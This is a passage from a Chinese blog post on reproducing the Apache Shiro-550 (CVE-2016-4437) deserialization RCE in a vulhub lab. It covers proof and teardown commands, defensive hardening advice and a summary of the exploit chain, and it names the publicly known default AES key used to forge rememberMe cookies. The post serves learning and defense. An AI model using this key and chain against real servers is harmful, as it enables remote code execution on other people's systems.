+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在 启动 docker 容器的宿主机  里</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker ps</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376838874_42700g.webp" loading='lazy'></p>
+<blockquote>
+<p>注意：我这里使用的攻击机和宿主机（容器）都是同一个 kali。</p>
+</blockquote>
+<hr>
+<p>结论：证明当前 shell 会话，就是连接到这个 Shiro 靶场 docker 容器内部， 验证 RCE 成功.</p>
+<h2 id="3-5-关闭靶场环境"><a href="#3-5-关闭靶场环境" class="headerlink" title="3.5 关闭靶场环境"></a>3.5 关闭靶场环境</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换到shiro CVE-2016-4437目录</span></span><br><span class="line"><span class="built_in">cd</span> ~/vulhub/shiro/CVE-2016-4437</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止容器，并且删除挂载的数据卷（彻底清理环境）</span></span><br><span class="line"><span class="built_in">sudo</span> docker-compose down -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证是否关闭成功</span></span><br><span class="line"><span class="built_in">sudo</span> docker ps</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<hr>
+<h1 id="四、防御"><a href="#四、防御" class="headerlink" title="四、防御"></a>四、防御</h1><blockquote>
+<p>漏洞根源：Shiro 1.2.4 及更早版本中，AES 密钥<strong>硬编码在源码内</strong>，攻击者可自行构造 rememberMe 的恶意序列化内容，后端解密后触发反序列化，最终实现远程代码执行（RCE）。  </p>
+</blockquote>
+<h2 id="4-1-核心"><a href="#4-1-核心" class="headerlink" title="4.1 核心"></a>4.1 核心</h2><h3 id="4-1-1-升级Apache-Shiro版本"><a href="#4-1-1-升级Apache-Shiro版本" class="headerlink" title="4.1.1 升级Apache Shiro版本"></a>4.1.1 升级Apache Shiro版本</h3><p>升级至 <code>1.2.5</code> 或更高版本。新版本移除了默认硬编码密钥，并且增加了反序列化相关安全校验，从根源修复该CVE漏洞。</p>
+<h3 id="4-1-2-自定义随机AES密钥"><a href="#4-1-2-自定义随机AES密钥" class="headerlink" title="4.1.2 自定义随机AES密钥"></a>4.1.2 自定义随机AES密钥</h3><p>禁止使用源码自带默认密钥。如果暂时无法升级，必须更换<code>shiro.ini</code>中<code>rememberMe</code>的AES密钥。</p>
+<ul>
+<li>不要使用网上流传的默认密钥：<code>kPH+bIxk5D2deZiIxcaaaA==</code></li>
+<li>使用密码学安全随机生成Base64密钥，并且妥善保管，不要泄露。</li>
+</ul>
+<blockquote>
+<p>注意：仅修改密钥<strong>不能解决反序列化本身风险</strong>，只能临时缓解手段。</p>
+<p>Apache Shiro 源码托管于 GitHub，1.2.4 版本源码可在 release 标签页下载：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a>。</p>
+<p>下载源码后查看<code>core/src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>，可找到硬编码的默认 AES 密钥，验证漏洞根源。 </p>
+<p>如果链接失效，访问我的仓库下载：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://gitee.com/jasminee0762/cyber-security/blob/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro-shiro-root-1.2.4.zip">https://gitee.com/jasminee0762/cyber-security/blob/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro-shiro-root-1.2.4.zip</a> </p>
+</blockquote>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376840929_67toq6.webp" loading='lazy'></p>
+<blockquote>
+</blockquote>
+<hr>
+<h2 id="4-2-反序列化安全加固"><a href="#4-2-反序列化安全加固" class="headerlink" title="4.2 反序列化安全加固"></a>4.2 反序列化安全加固</h2><ol>
+<li><strong>开启反序列化白名单</strong><br>高版本Shiro支持反序列化类白名单，只允许指定安全类被反序列化，禁止危险类。即使密钥泄露，也无法加载CC恶意利用链。</li>
+<li>禁用不需要的<code>rememberMe</code>记住我功能。业务不需要“记住我”，直接关掉该功能，不存在rememberMe Cookie，漏洞入口直接消失。</li>
+</ol>
+<hr>
+<h2 id="4-3-Web应用层面加固"><a href="#4-3-Web应用层面加固" class="headerlink" title="4.3 Web应用层面加固"></a>4.3 Web应用层面加固</h2><ol>
+<li>Cookie安全属性：给rememberMe Cookie添加 <code>HttpOnly; Secure</code><ul>
+<li>HttpOnly：JS无法读取Cookie，防止XSS窃取rememberMe值</li>
+<li>Secure：仅HTTPS传输Cookie，防止中间人抓包劫持Cookie</li>
+</ul>
+</li>
+<li>最小权限原则：Tomcat/Web容器<strong>不要用root运行</strong>，使用低权限业务账号启动。就算RCE成功，也限制攻击者权限。</li>
+</ol>
+<hr>
+<h2 id="4-4-运维-检测防护"><a href="#4-4-运维-检测防护" class="headerlink" title="4.4 运维/检测防护"></a>4.4 运维/检测防护</h2><ol>
+<li>WAF规则：添加特征检测，拦截rememberMe字段异常长、恶意加密载荷的Cookie请求；</li>
+<li>日志审计：监控异常rememberMe Cookie、大量Java反序列化报错日志；</li>
+<li>定期漏洞扫描，检测Shiro版本与默认密钥。</li>
+</ol>
+<hr>
+<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>本次复现 CVE-2016-4437 Apache Shiro 反序列化漏洞，漏洞成因是 Shiro 1.2.4 及之前版本存在公开的硬编码 AES 密钥。攻击者可自行构造带有系统命令的恶意序列化对象，利用公开密钥加密后放入 rememberMe Cookie 发送至目标。</p>
+<p>服务端收到 Cookie 后，先 Base64 解码，再使用内置硬编码 AES 密钥解密，之后触发不安全的反序列化操作。在解析恶意对象时会激活 Gadget 利用链，自动运行我们预先写入的系统命令，从而实现远程代码执行 RCE。  </p>
+<div class="post-extras-series"><div class="pes-title">📚 同系列文章 · vulhub（2 篇）</div><ol><li><a href="/2026/07/11/MSF的使用以及漏洞复现/">MSF的使用以及漏洞复现</a></li><li class="current">Shiro-550反序列化漏洞复现<span class="pes-cur">（本文）</span></li></ol></div><blockquote>
+<p>本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。‌‌‌‌‌‌‌‌‌​​‌​‌​‌‍‌‌‌‌‌‌‌‌‌​​‌‌‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌​​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​‌‌​‌​‍‌‌‌‌‌‌‌‌‌‌​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​‌‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌‌​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​​‌​‌‌‍‌‌‌‌‌‌‌‌‌​​‌​​​​‍‌‌‌‌‌‌‌‌‌​​​‌‌‌‌‍</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jasmine-iris.top">Jasmine_Iris</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jasmine-iris.top/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://jasmine-iris.top/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://jasmine-iris.top" target="_blank">Jasmine_Iris</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/Shiro/">Shiro</a><a class="post-meta__tags" href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java反序列化</a></div><div class="post-share"><div class="social-share" data-image="https://img.jasmine-iris.top/posts/Shiro-550反序列化漏洞复现/cover.webp" data-sites="wechat,qzone,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/09/11/Mr.Robot_1_Walkthrough/" title="Mr.Robot: 1 Walkthrough"><img class="cover" src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Mr.Robot: 1 Walkthrough</div></div><div class="info-2"><div class="info-item-1">VulnHub Mr.Robot: 1 靶机渗透完整复现：dirsearch 目录爆破发现 WordPress、fsocity.dic 字典爆破后台账号、主题编辑器写 webshell 拿 shell、破解 password.raw-md5 切换 robot 用户、Nmap SUID 提权拿到 key3，附 MSF overlayfs 内核提权失败复盘</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/" title="RCE漏洞"><img class="cover" src="https://img.jasmine-iris.top/posts/RCE漏洞/cover.webp" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-08</div><div class="info-item-2">RCE漏洞</div></div><div class="info-2"><div class="info-item-1">远程代码/命令执行漏洞（RCE）的原理、常见危险函数、利用方式与防御措施</div></div></div></a></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://img.jasmine-iris.top/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" loading='lazy'></div><div class="author-info-name">Jasmine_Iris</div><div class="author-info-description">Jasmine_Iris 的网络安全学习博客：渗透测试、CTF 题解与漏洞复现笔记。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Jasmineee007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Jasmineee007" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://gitee.com/jasminee0762" rel="external nofollow noreferrer" target="_blank" title="Gitee"><i class="fab fa-gitee" style="color: #c71d23;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客~ 📝<br><hr>最近更新：2026-09-14<br><br>新增文章：<br><a href="/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Shiro-550反序列化漏洞复现</a><br></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-text">一、漏洞背景</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AF-Apache-Shiro%EF%BC%9F"><span class="toc-text">1.1 什么是 Apache Shiro？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-RememberMe-%E6%AD%A3%E5%B8%B8%E7%9A%84%E5%B7%A5%E4%BD%9C%E9%80%BB%E8%BE%91"><span class="toc-text">1.2 RememberMe 正常的工作逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-CVE-2016-4437-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">1.3 CVE-2016-4437 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E7%89%88%E6%9C%AC%E8%8C%83%E5%9B%B4"><span class="toc-text">1.4 版本范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9"><span class="toc-text">1.5 漏洞特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-6-%E8%A1%A5%E5%85%85%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F"><span class="toc-text">1.6 补充：什么是序列化/反序列化？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">二、环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Q%EF%BC%9Avulhub-%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%EF%BC%9F"><span class="toc-text">Q：vulhub 如何搭建？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A0-%E8%BF%9B%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%9B%AE%E5%BD%95"><span class="toc-text">① 进入靶场目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A1-%E5%90%8E%E5%8F%B0%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8"><span class="toc-text">② 后台启动容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A2-%E6%9F%A5%E7%9C%8B%E5%AE%B9%E5%99%A8%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E5%90%AF%E5%8A%A8"><span class="toc-text">③ 查看容器是否成功启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A3-%E8%AE%BF%E9%97%AE%E9%9D%B6%E5%9C%BA%E9%A1%B5%E9%9D%A2"><span class="toc-text">④ 访问靶场页面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%85%8D%E5%A5%97%E5%91%BD%E4%BB%A4"><span class="toc-text">常用配套命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8E%92%E9%94%99"><span class="toc-text">简单排错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">三、漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%8C%87%E7%BA%B9%E6%8E%A2%E6%B5%8B"><span class="toc-text">3.1 指纹探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.2  验证漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q1%EF%BC%9Aysoserial-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">Q1：ysoserial 是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%9A%E4%B9%89"><span class="toc-text">1. 定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="toc-text">2. 核心概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%8B%E8%BD%BD"><span class="toc-text">3. 下载</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q2%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8DNSlog%E9%AA%8C%E8%AF%81%EF%BC%9F"><span class="toc-text">Q2：为什么要用DNSlog验证？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9ADNSlog"><span class="toc-text">方案一：DNSlog</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E8%8E%B7%E5%8F%96DNSlog%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-text">2.1 获取DNSlog子域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-ysoserial%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F%E5%BA%8F%E5%88%97%E5%8C%96payload"><span class="toc-text">2.2 ysoserial生成恶意序列化payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-%E5%88%9B%E5%BB%BA-shiro-%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC-shiro-enc-py"><span class="toc-text">2.3 创建 shiro 加密脚本 shiro_enc.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-Burp%E4%BF%AE%E6%94%B9Cookie%E5%8F%91%E5%8C%85"><span class="toc-text">2.4 Burp修改Cookie发包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9ABurp-%E4%B8%93%E4%B8%9A%E7%89%88%EF%BC%8C%E8%87%AA%E5%B8%A6-Collaborator"><span class="toc-text">方案二：Burp 专业版，自带 Collaborator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">3.3 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-0-%E7%A1%AE%E5%AE%9A%E5%90%88%E9%80%82%E7%9A%84-Gadget-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">3.3.0  确定合适的 Gadget 利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-1-Sleep-%E6%97%B6%E9%97%B4%E5%B7%AE%E9%AA%8C%E8%AF%81"><span class="toc-text">3.3.1 Sleep 时间差验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-2-AES%E5%8A%A0%E5%AF%86%EF%BC%8C%E7%94%9F%E6%88%90rememberMe%E7%9A%84Cookie%E5%80%BC"><span class="toc-text">3.3.2 AES加密，生成rememberMe的Cookie值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-3-Burp-Suite%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%E5%8F%91%E5%8C%85"><span class="toc-text">3.3.3 Burp Suite构造请求发包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-4-%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9%E5%91%BD%E4%BB%A4%E7%9A%84-base64"><span class="toc-text">3.3.4 生成反弹命令的 base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-5-%E7%94%9F%E6%88%90-payload"><span class="toc-text">3.3.5 生成 payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-6-%E5%8A%A0%E5%AF%86"><span class="toc-text">3.3.6 加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-7-%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC"><span class="toc-text">3.3.7 开启监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-8-bp-%E5%8F%91%E5%8C%85"><span class="toc-text">3.3.8 bp 发包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-9-%E6%8B%BF%E5%88%B0-shell"><span class="toc-text">3.3.9 拿到 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E8%AF%81%E6%98%8E"><span class="toc-text">3.4 证明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-1-%E8%BA%AB%E4%BB%BD%E8%AF%81%E6%98%8E"><span class="toc-text">3.4.1 身份证明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-2-%E5%AE%9A%E4%BD%8D%E8%AF%81%E6%98%8E%E2%80%93%E5%AE%B9%E5%99%A8-ID"><span class="toc-text">3.4.2 定位证明–容器 ID</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-%E5%85%B3%E9%97%AD%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">3.5 关闭靶场环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%98%B2%E5%BE%A1"><span class="toc-text">四、防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E6%A0%B8%E5%BF%83"><span class="toc-text">4.1 核心</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-1-%E5%8D%87%E7%BA%A7Apache-Shiro%E7%89%88%E6%9C%AC"><span class="toc-text">4.1.1 升级Apache Shiro版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-2-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%9A%8F%E6%9C%BAAES%E5%AF%86%E9%92%A5"><span class="toc-text">4.1.2 自定义随机AES密钥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="toc-text">4.2 反序列化安全加固</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-Web%E5%BA%94%E7%94%A8%E5%B1%82%E9%9D%A2%E5%8A%A0%E5%9B%BA"><span class="toc-text">4.3 Web应用层面加固</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E8%BF%90%E7%BB%B4-%E6%A3%80%E6%B5%8B%E9%98%B2%E6%8A%A4"><span class="toc-text">4.4 运维/检测防护</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">五、总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Shiro-550反序列化漏洞复现"><img src="https://img.jasmine-iris.top/posts/Shiro-550反序列化漏洞复现/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro-550反序列化漏洞复现" loading='lazy'></a><div class="content"><a class="title" href="/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Shiro-550反序列化漏洞复现">Shiro-550反序列化漏洞复现</a><time datetime="2026-09-14T02:00:00.000Z" title="发表于 2026-09-14 10:00:00">2026-09-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/09/11/Mr.Robot_1_Walkthrough/" title="Mr.Robot: 1 Walkthrough"><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mr.Robot: 1 Walkthrough" loading='lazy'></a><div class="content"><a class="title" href="/2026/09/11/Mr.Robot_1_Walkthrough/" title="Mr.Robot: 1 Walkthrough">Mr.Robot: 1 Walkthrough</a><time datetime="2026-09-11T02:30:00.000Z" title="发表于 2026-09-11 10:30:00">2026-09-11</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2025 - 2026 By Jasmine_Iris</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div><div class="footer_custom_text"><a href="/atom.xml" target="_blank" rel="noopener">RSS 订阅</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = {"login":"force","emoji":["https://img.jasmine-iris.top/emoji/weibo","https://img.jasmine-iris.top/emoji/bilibili","https://img.jasmine-iris.top/emoji/qq","https://img.jasmine-iris.top/emoji/tieba","https://img.jasmine-iris.top/emoji/alus","https://img.jasmine-iris.top/emoji/bmoji"]}
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline.jasmine-iris.top',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline }
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
